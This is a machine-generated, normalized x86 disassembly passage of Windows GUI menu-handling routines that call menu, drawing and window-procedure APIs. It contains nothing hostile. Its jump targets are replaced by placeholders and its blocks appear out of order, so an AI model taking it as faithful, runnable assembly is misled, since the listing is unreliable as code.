mov eax esi
call sub_44fab0
mov eax ebx
pop esi
pop ebx
retn
sub_450a68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_44f6ac
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_44f6bc
call sub_450a68
pop ecx
test al al
je r-xdata
sub_450b00
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_450a68
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44d16c
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_450b30
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_450b00
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_451e54
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_450ba0
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_450b00
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_450bbc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_450b00
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_45026c
mov ebx eax
xor edx edx
mov eax edi
call sub_450768
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_44fbd4
mov eax [ esi + 0x34 ]
call sub_44fbd4
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_44db10
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_443c60
push eax
call DrawMenuBar
sub_450ca8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_450ca8
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_450dcd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_450b00
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_44fbd4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_450c98
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_450dfc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42550c
xor eax eax
push ebp
push sub_450efa
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42550c
xor eax eax
push ebp
push sub_450ecf
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_450ca8
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_425504
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450f01
mov eax [ rw-data ]
call sub_425504
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_450b00
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_450f20
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_4512a4
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_4512a4
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_450fdc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_451578
mov eax ebx
call sub_408638
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45107c
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_450fdc
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404168
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4043b8
lea edx [ ebp - 0x200 ]
call sub_408728
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_451110
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_451180
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_451620
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_451620
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_451620
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_45118c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45107c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_451110
mov eax ebx
call sub_451644
jmp r-xdata
sub_4511f4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45123c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44b46c
mov eax ebx
call sub_450a50
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44b4b0
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41ab4c
sub_451278
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41ad98
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45123c
sub_4512bc
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_450b00
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_450b00
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_4545a8
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_451318
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_4513ed
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_450b00
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_450b00
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_44f6ac
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44f6bc
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_4040e0
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_4040e0
mov eax [ ebp - 0xc ]
pop edx
call sub_407d24
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_452164
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4513f4
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f1c
retn
sub_451400
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4512bc
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_451318
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_451578
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_450c84
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_450b00
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_450b00
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408708
mov eax [ ebp + 0x10 ]
call sub_408620
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_451644
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43a310
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_451620
mov [ ebx + 0x41 ] 0x1
sub_45166c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032d4
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_451620
mov [ ebx + 0x41 ] 0x1
sub_4516f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4511f4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45107c
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_451788
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_4517c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4517ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451810
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451d43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451d4a
lea eax [ ebp - 0x30 ]
call sub_403ef8
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov edx [ esi + 0x4 ]
call sub_450bbc
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45dbb8
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov dx [ esi + 0x4 ]
call sub_450ba0
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e79c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_451b76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_451b59
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41ee14
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41ecb4
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_451fe8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451b60
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41ee14
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_451400
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_450b00
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_450b00
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_451cb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e79c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_451c94
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_451c77
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41ee14
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41ecb4
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451c7e
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41ee14
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43a594
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45dbb8
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_450b00
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
